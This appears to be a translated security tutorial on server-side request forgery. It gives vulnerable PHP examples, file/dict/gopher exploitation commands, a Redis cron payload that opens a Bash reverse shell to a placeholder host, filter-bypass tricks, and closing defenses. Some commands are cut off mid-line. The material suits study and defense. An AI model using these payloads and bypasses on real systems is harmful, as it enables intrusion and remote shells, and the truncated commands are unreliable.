---
title: Server-Side Request Forgery (SSRF)
---

# Server-Side Request Forgery (SSRF)

## SSRF Principle

SSRF (Server-Side Request Forgery) is a security vulnerability where an attacker constructs a request that is initiated by the server.

In general, SSRF targets internal systems that cannot be accessed from the external network. Because the request is initiated by the server, it can reach internal networks connected to the server but isolated from the public internet. In other words, a request-making service can be used as a pivot for attacks.

Data flow: attacker ---> server ---> target address

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240619113821033.png)

### Causes of SSRF

SSRF usually occurs because the server provides functionality to fetch data from other server applications but does not filter or restrict the target address.

Examples include fetching webpage text from a specified URL, loading images from a specified address, downloading content, and similar features. The exploitation uses server-side request forgery. SSRF uses a vulnerable web application as a proxy to attack remote and local servers.

### Common Places Where SSRF Appears

1. Transcoding services
2. Online translation
3. Image loading and downloading (loading or downloading images through a URL)
4. Image or article bookmarking features
5. Website collection and web crawling features
6. Avatar features that load avatars remotely
7. Any place where you are asked to enter a URL or can enter an IP address
8. URL-related keywords:

```
share
wap
url
link
src
source
target
u
3g
display
sourceURl
imageURL
domain
...
```

### Attacks Possible Through SSRF

1. Scan ports on the internet, the server's internal network, or localhost, and obtain service [banner information](https://www.cnblogs.com/yuanshu/p/11588341.html).
2. Attack applications running on the internal network or locally.
3. Fingerprint internal web applications by accessing default files, such as readme files.
4. Attack internal and external web applications, mainly attacks that can be triggered through GET parameters, such as Struts2 and SQL injection.
5. Download internal resources, such as using the `file` protocol to read local files.
6. Use the server as a pivot.
7. Bypass CDN restrictions.
8. Use Redis unauthorized access and HTTP CRLF injection to get a shell.

## SSRF-Related Functions and Protocols

### **Functions**

Improper use of functions such as `file_get_contents()`, `fsockopen()`, `curl_exec()`, `fopen()`, and `readfile()` can cause SSRF vulnerabilities.

(1) `file_get_contents()`

```
<?php
$url = $_GET['url'];;
echo file_get_contents($url);
?>
```

The `file_get_content` function retrieves content from a user-specified URL, saves it with a specified filename, and displays it to the user. The `file_put_content` function writes a string to a file.

(2) `fsockopen()`

```
<?php
function GetFile($host,$port,$link) {
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
    if (!$fp) {
        echo "$errstr (error number $errno) \n";
    } else {
        $out = "GET $link HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        $out .= "\r\n";
        fwrite($fp, $out);
        $contents='';
        while (!feof($fp)) {
            $contents.= fgets($fp, 1024);
        }
        fclose($fp);
        return $contents;
    }
}
?>
```

The `fsockopen` function retrieves data from a user-specified URL. It establishes a TCP connection to the server through a socket (port) and transfers data. The variable `host` is the hostname, `port` is the port, `errstr` returns error information as a string, and `30` is the timeout.

(3) `curl_exec()`

```
<?php  if (isset($_POST['url'])){    $link = $_POST['url'];    $curlobj = curl_init();// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源     $filename = './curled/'.rand().'.txt';    file_put_contents($filename, $result);     echo $result; } ?>
```

The `curl_exec` function executes a specified cURL session.

**Notes**

```
1. In general, PHP does not enable the gopher wrapper for fopen.

2. The gopher protocol in file_get_contents cannot be URL-encoded.

3. file_get_contents has a bug with 302 redirects involving Gopher, which can cause exploitation to fail.

4. curl/libcurl 7.43 has a gopher protocol bug (%00 truncation). Version 7.49 was tested as usable.

5. curl_exec() does not follow redirects by default.

6. file_get_contents() supports the php://input protocol.
```

### Protocols

(1) `file`: when there is output, the `file` protocol can read arbitrary content.

(2) `dict`: leaks installed software version information, checks ports, operates internal Redis services, and more.

(3) `gopher`: gopher supports GET and POST requests. You can intercept GET or POST packets first, then construct requests that match the gopher protocol. Gopher is one of the most powerful protocols for SSRF exploitation, often called a universal protocol. It can be used for reverse shells.

(4) `http/s`: probes whether internal hosts are alive.

## SSRF Exploitation

### Local Exploitation

Using curl as an example, view the list of protocols supported by curl with `curl -V`.

(1) Use the `file` protocol (arbitrary file read)

```
curl -vvv 'file:///etc/passwd'
```

(2) Use the `dict` protocol (obtain Redis configuration information)

```
curl -vvv 'dict://127.0.0.1:6379/info'
```

(3) Use the `gopher` protocol, commonly called a universal protocol, for one-click Bash reverse shell.

**Remote exploitation methods**

1. Use the `file` protocol.

Arbitrary file read:

```
curl -v 'http://x.x.x.x:xxxx/ssrf.php?url=fil
```

2. Use the `dict` protocol.

(1) View port status and service version information on a port:

```
curl -v 'http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/'
```

This indicates that port 22 is open.

(2) Get a shell through the `dict` protocol.

About the `dict` protocol: it sends `command:parameter` to a server port and automatically appends `\r\n` (CRLF) at the end.

The `dict` protocol must execute commands one by one, while the `gopher` protocol can execute a command in one request.

Execute the commands one by one.

3. Use the `gopher` protocol.

(1) Attack internal Redis and obtain a reverse shell.

Exploit Redis unauthorized access to attack Redis.

Redis exploit:

```
echo -e "\n\n\n*/1 * * * * bash -i >& /dev/tcp/x.x.x.x/1234 0>&1\n\n\n"|redis-cli -h $1 -p $2 -x set 1

redis-cli -h $1 -p $2 config set dir /var/spool/cron/

redis-cli -h $1 -p $2 config set dbfilename root

redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit
```

```
bash shell.sh x.x.x.x 6379
```

Capture the data and convert it.

Conversion rules:

If the first character is `>` or `<`, discard the line. It indicates request and response timing.

If the first three characters are `+OK`, discard the line. It indicates a returned string.

Replace `\r` strings with `%0d%0a`.

Replace blank lines with `%0a`.

Combine the converted result with the gopher protocol to attack internal Redis, then perform a reverse shell:

```
curl -v 'http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.x.x:6379/_curl -v
```

Reverse shell succeeds.

4. Use the `http/s` protocol.

Probe whether internal hosts are alive.

## SSRF Bypasses

### Common Bypass Methods

**1. `@`**

http://abc@127.0.0.1

This actually connects to `127.0.0.1` with username `abc`. Similarly:

http://8.8.8.8@127.0.0.1:8080, http://127.0.0.1#8.8.8.8

Different parsing functions handle `@` in domain parsing differently, for example:

http://www.aaa.com@www.bbb.com@www.ccc.com

PHP `parse_url` identifies `www.ccc.com`, while libcurl identifies `www.bbb.com`.

**2. Use `[::]`**

`[::]` can be used to bypass `localhost`.

```
http://[::]:80/  >>>  http://127.0.0.1http://[::]:80/  >>>
```

**3. Add a port number**

http://127.0.0.1:8080

**4. Use short URLs**

[Chinaz short URL tool](http://tool.chinaz.com/tools/dwz.aspx)

**5. Use special domains**

`127.0.0.1.xip.io` can resolve to `127.0.0.1`.

Set an A record on the domain to point to `127.0.1`.

**7. Use numeric-base conversion**

127.0.0.1 in octal: 0177.0.0.1

Hexadecimal: 0x7f.0.0.1

Decimal: 2130706433

**8. Full-width dots**

127。0。0。1  >>>  127.0.0.1

**9. 302 redirects**

Use [https://tinyurl.com to generate a 302 redirect address](https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/)

### Common Restrictions

**1. Restricted to the** [**http://www.xxx.com**](http://www.xxx.com) **domain**

Bypass with HTTP basic-authentication syntax, namely `@`:

http://www.xxx.com@www.xxc.com

**2. Requested IP must not be an internal address**

When internal IP addresses are not allowed:

(1) Use short URLs.

(2) Use special domains.

(3) Use numeric-base conversion.

**3. Request protocol must be HTTP only**

(1) Use 302 redirects.

(2) Use short URLs.

**SSRF defenses**

1. Disable unnecessary protocols, such as `file:///`, `gopher://`, and `dict://`. Allow only HTTP and HTTPS requests.

2. Use unified error messages to prevent port status inference from error differences.

3. Disable 302 redirects, or check whether the new host is an internal IP at every redirect until the final URL is reached.

4. Configure a URL allowlist or restrict internal IP addresses.
